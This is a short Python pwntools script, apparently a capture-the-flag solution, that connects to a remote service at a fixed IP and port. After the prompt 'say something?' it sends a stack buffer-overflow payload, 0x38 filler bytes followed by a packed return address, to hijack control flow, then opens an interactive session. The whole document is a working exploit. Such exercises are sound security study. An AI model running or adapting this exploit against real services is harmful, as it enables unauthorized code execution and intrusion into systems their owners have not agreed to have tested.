from pwn import *

r = remote("114.116.54.89", 10003)


payload = 'a' * (0x30 + 8) + p64(0x400751)
r.recvuntil("say something?")
r.sendline(payload)

r.interactive()
